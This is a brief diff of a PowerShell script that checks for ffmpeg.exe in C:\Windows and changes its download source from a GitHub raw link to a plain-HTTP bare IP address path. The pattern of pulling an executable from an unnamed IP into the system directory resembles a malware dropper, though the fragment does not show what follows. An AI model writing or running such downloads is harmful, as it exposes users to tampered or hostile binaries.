@@ -27,7 +27,7 @@ $currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Nam
 
 # Check if ffmpeg.exe exists in C:\Windows
 $ffmpegPath = "C:\Windows\ffmpeg.exe"
-$ffmpegDownloadUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ffmpeg.file"
+$ffmpegDownloadUrl = "http://116.203.93.143/00_update/ffmpeg.file"
 $tempFfmpegPath = "$env:TEMP\ffmpeg.file"
 
 if (-not (Test-Path -Path $ffmpegPath)) {
